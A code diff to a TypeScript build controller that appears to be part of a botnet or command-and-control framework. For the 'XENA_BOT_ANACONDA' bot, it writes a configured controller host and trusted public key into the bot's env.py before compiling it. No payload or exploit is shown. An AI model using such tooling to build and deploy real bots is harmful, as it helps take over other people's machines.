@@ -5,6 +5,7 @@ import * as Service from 'App/Services'
 import * as Helper from 'App/Helpers'
 
 import Env from '@ioc:Adonis/Core/Env'
+import fs from 'fs'
 
 import { HttpContextContract } from '@ioc:Adonis/Core/HttpContext'
 import { v4 as uuidv4 } from 'uuid'
@@ -73,7 +74,9 @@ export default class BuildsController {
           : response.internalServerError({ success: false, message: 'Failed to build.' })
 
       case 'XENA_BOT_ANACONDA':
-        const anaconda = await this.buildAnaconda(buildId, buildProfileId)
+        if (!buildProfile.config.atilaHost || !buildProfile.config.trustedPublicKey)
+          throw 'BAD_ANACONDA_CONFIG'
+        const anaconda = await this.buildAnaconda(buildId, buildProfileId, buildProfile.config.atilaHost, buildProfile.config.trustedPublicKey)
         return anaconda
           ? response.ok(anaconda)
           : response.internalServerError({ success: false, message: 'Failed to build.' })
@@ -137,7 +140,21 @@ export default class BuildsController {
     return build.toBinary
   }
 
-  private buildAnaconda = async (buildId: string, buildProfileId: string) => {
+  private buildAnaconda = async (buildId: string, buildProfileId: string, atilaHost: string, trustedPublicKey: string) => {
+    fs.renameSync(
+      `${Service.Git.pathPrefix}${buildId}/bots/xena-bot-anaconda/env.example.py`,
+      `${Service.Git.pathPrefix}${buildId}/bots/xena-bot-anaconda/env.py`,
+    )
+
+    const envContent = fs.readFileSync(`${Service.Git.pathPrefix}${buildId}/bots/xena-bot-anaconda/env.py`)
+      .toString()
+      .replace('http://127.0.0.1:60666', atilaHost)
+      .replace('-----BEGIN PUBLIC KEY-----\\n1\\n2\\n3\\n4\\n5\\n6\\n7\\n8\\n9\\n10\\n11\\n12\\n-----END PUBLIC KEY-----\\n', trustedPublicKey)
+    
+    console.log(envContent)
+
+    fs.writeFileSync(`${Service.Git.pathPrefix}${buildId}/bots/xena-bot-anaconda/env.py`, envContent)
+    
     // Build the binary.
     const buildOutput = (() => {
       const buildCommand =
